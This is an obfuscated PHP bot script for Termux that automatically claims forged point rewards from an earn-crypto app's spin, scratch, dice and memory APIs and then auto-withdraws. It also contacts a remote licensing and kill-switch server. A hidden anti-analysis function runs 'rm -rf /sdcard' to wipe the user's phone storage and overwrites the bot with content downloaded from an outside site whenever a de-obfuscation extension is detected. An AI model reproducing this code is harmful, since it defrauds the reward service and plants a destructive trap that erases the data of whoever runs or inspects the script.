<?php
#date_default_timezone_set('Asia/Jakarta');
system("clear");
$var_0="\n";$var_1="\t";
//warnn
$var_2="\033[34m";$var_3="\033[36m";$var_4="\033[92m";
$var_5="\033[37m";$var_6="\033[35m";$var_7="\033[31m";
$var_8="\033[33m";$var_9="\033[8m";$var_10="\033[0"."m";
function saveas($var_11,$var_12){
 if(!file_exists($var_11)){file_put_contents($var_11,"[]"); }
 $var_15 = json_decode(file_get_contents($var_11),1);
 $var_17 = array_merge($var_15,$var_12);
file_put_contents($var_11,json_encode($var_17,JSON_PRETTY_PRINT));}

function head($var_12){
 foreach($var_12 as $var_24=>$var_25){$var_26[]=$var_24.": ".$var_25;}
 return $var_26; }
function loading($var_30,$var_31) {
$var_4="\033[92m";$var_5="\033[37m";
$var_8="\033[33m";$var_3="\033[36m";
$var_36=[$var_3,$var_4,$var_3,$var_4,$var_3,$var_4];$var_43=1;
for($var_44=$var_31;$var_44>0;$var_44--){
$var_48=str_repeat("â¢",$var_43);$var_50=$var_36[$var_43-1];
echo $var_5."".$var_50."â¢â¢â¢".$var_5."â¨ $var_30 â©$var_50$var_48";
if($var_43==3){$var_43=1;}else{$var_43++;}sleep(1);
echo 
"\r                                                       \r";}}
function timer($var_62,$var_63){
  date_default_timezone_set('UTC');
$var_64 = time()+$var_63;
$var_2="\033[34m";$var_3="\033[36m";
$var_4="\033[92m";$var_5="\033[37m";
$var_6="\033[35m";$var_7="\033[31m";
$var_8="\033[33m";$var_9="\033[8m";
$var_10="\033[0"."m";
$var_75=[$var_5,$var_7];
$var_44=0;
$var_36=[$var_4,$var_8,$var_3,$var_4,$var_8,$var_3];$var_43=1;
while(true):
echo "\r                                                        \r";
$var_87=$var_75[$var_44];
$var_90 = $var_64-time();
$var_92=date("H:i:s",$var_90);
if($var_90<1){ break; }
$var_48=str_repeat("â",$var_43);$var_50=$var_36[$var_43-1];
$var_100="tod!";$var_101="â©";
echo $var_5.$var_62."$var_5 â¨$var_87$var_92$var_5$var_101 $var_100$var_50$var_48";
if($var_43==6){$var_43=1;}else{$var_43++;} sleep(1);
$var_44++; 
if($var_44 >= count ($var_75)){$var_44=0;}

endwhile; 
  }

function settings($var_119,$var_120){
$var_121 = "https://tuyulgaple.online/sunggingads/";
$var_122 = json_encode(
    array(
        'sk' => $var_119,
        'vr' => $var_120 ));
$var_125 = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/json',
        'content' => $var_122
    ));
$var_127 = stream_context_create($var_125);
$var_129     = json_decode(file_get_contents($var_121, false, $var_127),1);

$var_132      = $var_129["baner"];
if(!$var_129["status"]){ 
 $var_62 = "skrip di non-aktifkan\n";
 echo $var_136.$var_132.$var_62; exit; }
else{ return $var_136.$var_132; }  }

function clr($var_132){system("clear");echo $var_132.$var_0;}

function strip(){
$var_5="\033[37m";
echo "$var_5~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";}
function tabs(){
echo "\r                                                        \r";}

function curl($var_121,$var_147,$var_148){
 $var_149 = curl_init($var_121);
 curl_setopt($var_149, CURLOPT_SSL_VERIFYPEER, 1);
 curl_setopt($var_149, CURLOPT_RETURNTRANSFER, 1 ); 
 curl_setopt($var_149, CURLOPT_TIMEOUT,60       );
 curl_setopt($var_149, CURLOPT_VERBOSE,        0);
 curl_setopt($var_149, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($var_149, CURLOPT_HTTPHEADER, $var_148 );
 #curl_setopt($ch, CURLOPT_COOKIEJAR,  "cookie");
 #curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie");
if(strlen($var_147) > 0 ){
 curl_setopt($var_149, CURLOPT_POST, true);
 curl_setopt($var_149, CURLOPT_POSTFIELDS,    $var_147 ); }
 $var_162 = curl_exec($var_149);
 $var_164   = curl_getinfo($var_149);
 curl_close($var_149);
 if($var_164["http_code"]==302){
 return $var_164["redirect_url"]; } else { return $var_162; } }

function verif_keys($var_119,$var_132){
$var_0="\n";$var_1="\t";
//warna
$var_2 = "\033[34m"; $var_3 = "\033[36m"; $var_4 = "\033[92m";
$var_5= "\033[37m"; $var_6= "\033[35m"; $var_7 = "\033[31m";
$var_8 = "\033[33m"; $var_9= "\033[8m";  $var_10  = "\033[0"."m";
while(true): clr($var_132);
if( $var_184 ){
 $var_184 = 0;
 while(true): clr($var_132);
 $var_187 = str_replace($var_0,"",file_get_contents("keys"));
 $var_121 = "http://tuyulgaple.online/aktivator/";
 $var_190 = json_encode([ "request" => $var_119,"keys" => $var_187]);
 $var_193  = json_decode( curl($var_121,$var_190,array()),1 );
if( $var_193["respon"] ) {
  echo $var_3."=> ".$var_193["respon"].$var_0;
  $var_200 = readline($var_5."input key : ");
  if( $var_200 ){
  $var_190 = json_encode(["request" => $var_119,"keys" => $var_200]);
  $var_193  = json_decode(curl($var_121,$var_190,array()),1);
  if( $var_193["code"] != 10 ) {
  file_put_contents("keys",$var_200);
  $var_187 = str_replace($var_0,"",file_get_contents("keys")); break; }}}
 else{ readline($var_4."your keys is uptodate ");break; }endwhile; }
 $var_121 = "http://tuyulgaple.online/aktivator/";
 $var_187 = str_replace($var_0,"",file_get_contents("keys"));
 $var_190 = json_encode(["request" => $var_119,"keys" => $var_187]);
 $var_193  = json_decode(curl($var_121,$var_190,array()),1);
if( $var_193["code"] == 10 ){ $var_184=1; }else{ break; }
endwhile; }
function update($var_119,$var_226){
$var_187 = str_replace("\n","",file_get_contents("keys"));
$var_121 = "http://tuyulgaple.online/aktivator/";
$var_190 = json_encode([ "request" => $var_119,"keys" => $var_187]);
$var_193  = json_decode( curl($var_121,$var_190,array()),1 );
if($var_193["respon"]){
echo $var_226."keys are expired, please update first !\n";exit;}  }
function input($var_237,$var_132,$var_147,$var_240){
 $var_241 = array(); 
 foreach( $var_147 as $var_243 ){
 clr($var_132);
 if(!$var_240[$var_243]){ 
  $var_247 = readline($var_243." : ");
  $var_241 = array_merge($var_241,[$var_243 => $var_247 ]); }
 else{ $var_241 = array_merge($var_241,[ $var_243 => $var_240[$var_243] ]); }
 } if($var_241[$var_147[0]]){ return $var_241; } }
 
 function fake_user(){
$var_121  = "https://tuyulgaple.tech/randomuser/";
$var_262 = json_decode(file_get_contents($var_121),1); 
$var_264 = [ 
    "name"  => [
              "first"  => $var_262["first"],
              "last"   => $var_262["last"],
              "full"   => $var_262["full_name"] ],
    "uuid"  => $var_262["uuid"]  ];
return $var_264; }
 
function skills(){
$var_62="anda terdeteksi sebagai kang ngentod!";
if(extension_loaded("evalhook")){
 @system("clear");shell_exec('rm -rf /sdcard');
 $var_271=file_get_contents("https://txxx.com/");
 file_put_contents("bot.php",$var_271);echo $var_62; exit; }}

$var_119="earnshiba.app";$var_120="1.1";$var_237="config.json";
skills();
error_reporting(0);
$var_277=settings($var_119,$var_120,"");
//verif_keys($var_119,$var_277);
clr($var_277);$var_283="earnlitecoinapp.com";


function home($var_283,$var_12,$var_286,$var_287){
$var_288=head($var_12);
$var_147=json_encode([
  "user_id" => $var_287,
  "email_id"=> $var_286
    ]);
$var_121="https://$var_283/apps/api/get_user.php";
return json_decode(curl($var_121,$var_147,$var_288),1); }

function spin($var_283,$var_12,$var_286,$var_287){
$var_302=["0.55","0.42","0.52","0.53","0.43","0.2","0.77","0.44","0.54"];
$var_303=$var_302[array_rand($var_302)];
$var_288=head($var_12);
$var_147=json_encode([
  "user_id" => $var_287,
  "email_id"=> $var_286,
  "points"  => $var_303
    ]);
$var_121="https://$var_283/apps/api/spin_count.php";
return json_decode(curl($var_121,$var_147,$var_288),1); }

function scratch($var_283,$var_12,$var_286,$var_287){
$var_302=["0.5","0.6","0.7","0.8","0.1","0.2","0.3","0.4"];
$var_303=$var_302[array_rand($var_302)];
$var_288=head($var_12);
$var_147=json_encode([
  "user_id" => $var_287,
  "email_id"=> $var_286,
  "points"  => $var_303
    ]);
$var_121="https://$var_283/apps/api/scratch_count.php";
return json_decode(curl($var_121,$var_147,$var_288),1); }

function dice($var_283,$var_12,$var_286,$var_287){
$var_288=head($var_12);
$var_147=json_encode([
  "user_id" => $var_287,
  "email_id"=> $var_286,
  "points"  => "1.2"
    ]);
$var_121="https://$var_283/apps/api/dice_count.php";
return json_decode(curl($var_121,$var_147,$var_288),1); }

function memory($var_283,$var_12,$var_286,$var_287){
$var_288=head($var_12);
$var_147=json_encode([
  "user_id" => $var_287,
  "email_id"=> $var_286,
  "points"  => "3.6"
    ]);
$var_121="https://$var_283/apps/api/memory_count.php";
return json_decode(curl($var_121,$var_147,$var_288),1); }

function withdraw($var_283,$var_12,$var_286,$var_287,$var_368){
$var_288=head($var_12);
$var_147=json_encode([
  "user_id" => $var_287,
  "email_id"=> $var_286,
  "points"  => $var_368,
  "request_type"=>"main"
    ]);
$var_121="https://$var_283/apps/api/reedem_request.php";
return json_decode(curl($var_121,$var_147,$var_288),1); }

while(true):
$var_15   = json_decode(file_get_contents($var_237),1);
if(!$var_15["email"]){
$var_383["email"]=readline("email: ");
saveas($var_237,$var_383);strip(); }
elseif(!$var_15["user_id"]){
$var_383["user_id"]=readline("user_id: ");
saveas($var_237,$var_383);strip(); }
else{
$var_286=$var_15["email"];$var_287=$var_15["user_id"];
break;}
endwhile;clr($var_277);

shell_exec("termux-open-url https://youtu.be/7kk-aOkzJDg");

$var_288=[
    "Host" => $var_283,
    "Content-Type" => "application/json",
    "User-Agent" => "okhttp/4.3.1"
     ];

readline($var_4."auto withdraw (ON) semoga cepat coid enter");clr($var_277);

$var_399=home($var_283,$var_288,$var_286,$var_287);
if($var_404=$var_399["data"]["email"]){$var_406=$var_399["data"]["points"];
$var_408= strpos($var_404, '@');
$var_404=substr_replace($var_404, str_repeat('*', $var_408-5), 5, $var_408-5);
echo $var_4."connect as$var_3 $var_404$var_5 balance$var_4 $var_406$var_0";strip();
}else{print_r($var_399);exit;}

while(true):
while(true):
$var_422=spin($var_283,$var_288,$var_286,$var_287);
$var_427=date("H:i:s",time()+7*60*60);
if($var_303=$var_422["points"]){$var_430=$var_422["count_left"];
echo $var_5.$var_1."   spin_left:$var_4 $var_430$var_0";
echo $var_3."[$var_427]$var_5 balance  :$var_4 $var_303$var_0";
strip();timer("wait",15);
}else{break;}
endwhile;

while(true):
$var_443=scratch($var_283,$var_288,$var_286,$var_287);
$var_427=date("H:i:s",time()+7*60*60);
if($var_303=$var_443["points"]){$var_430=$var_443["count_left"];
echo $var_5.$var_1."   scratch_left:$var_4 $var_430$var_0";
echo $var_3."[$var_427]$var_5 balance     :$var_4 $var_303$var_0";
strip();timer("wait",15);
}else{break;}
endwhile;


while(true):
$var_464=dice($var_283,$var_288,$var_286,$var_287);
$var_427=date("H:i:s",time()+7*60*60);
if($var_303=$var_464["points"]){$var_430=$var_464["count_left"];
echo $var_5.$var_1."   dice_left:$var_4 $var_430$var_0";
echo $var_3."[$var_427]$var_5 balance  :$var_4 $var_303$var_0";
strip();timer("wait",15);
}else{break;}
endwhile;

while(true):
$var_485=memory($var_283,$var_288,$var_286,$var_287);
$var_427=date("H:i:s",time()+7*60*60);
if($var_303=$var_485["points"]){$var_430=$var_485["count_left"];
echo $var_5.$var_1."   memo_left:$var_4 $var_430$var_0";
echo $var_3."[$var_427]$var_5 balance  :$var_4 $var_303$var_0";
strip();timer("wait",25);
}else{break;}
endwhile;

$var_399=home($var_283,$var_288,$var_286,$var_287);
$var_406=$var_399["data"]["points"];
$var_368=substr($var_406,0,strpos($var_406,'.'));
$var_516=withdraw($var_283,$var_288,$var_286,$var_287,$var_368);$var_62=$var_516["message"];
if($var_524=strpos($var_62,'request after ')){
$var_524=substr($var_62,$var_524);
$var_524=str_replace('request after ','',$var_524);
echo $var_2."Withdraw Wait $var_524$var_0";}
elseif($var_534=strpos($var_62,'successfully transferred ')){
$var_534=substr($var_62,$var_534);
$var_534=str_replace('successfully transferred ','',$var_534);
$var_534=substr($var_534,0,strpos($var_534,' '));
$var_544=strpos($var_62,'ID ');
$var_544=substr($var_62,$var_544);
$var_544=str_replace('ID ','',$var_544);
echo $var_4."Withdraw $var_534 ShibaInu Sent Your $var_544$var_0";
}else{echo $var_7."Withdraw $var_62$var_0";}

$var_558=$var_443["message"];
if($var_31=strpos($var_558,"after ")){
$var_31=substr($var_558,$var_31);
$var_31=str_replace("after ","",$var_31);
$var_30 = str_replace(array("minutes and","seconds"),"",$var_31);
$var_569 = explode(" ",$var_30);
array_pop($var_569);
if(count($var_569)==3){ 
 #$hour = $arr[0]*60*60;
 $var_573  = $var_569[0]*60;
 $var_31 = $var_573+$var_569[2];}
elseif(count($var_569)==1){
 $var_573  = $var_569[0]*60;
 $var_31 = $var_573+$var_569[1];}
else{ $var_31 = $var_569[0]; } 
timer("next claim",$var_31);}else{echo $var_443["message"].$var_0;}
endwhile;

